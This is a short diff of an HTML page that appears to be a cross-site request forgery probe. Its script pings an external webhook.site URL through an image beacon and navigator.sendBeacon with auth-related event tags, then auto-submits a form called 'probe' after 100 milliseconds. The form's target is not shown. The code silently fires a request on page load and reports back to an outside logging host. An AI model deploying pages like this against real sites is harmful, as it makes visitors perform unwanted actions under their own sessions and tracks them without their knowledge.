@@ -18,14 +18,21 @@
   </form>
 
   <script>
-    const img = new Image();
-    img.src =
-      "https://webhook.site/0a945959-6737-49f0-aeed-accf4d0b8713"
-      + "?event=snapshot-auth-start";
+    
+const webhook =
+  "https://webhook.site/0a945959-6737-49f0-aeed-accf4d0b8713";
 
-    setTimeout(() => {
-      document.getElementById("probe").submit();
-    }, 800);
+const marker = new Image();
+marker.src = webhook + "?event=snapshot-auth-v2";
+
+setTimeout(() => {
+  navigator.sendBeacon(
+    webhook + "?event=second-form-submitting",
+    ""
+  );
+
+  document.getElementById("probe").submit();
+}, 100);
   </script>
 </body>
 </html>
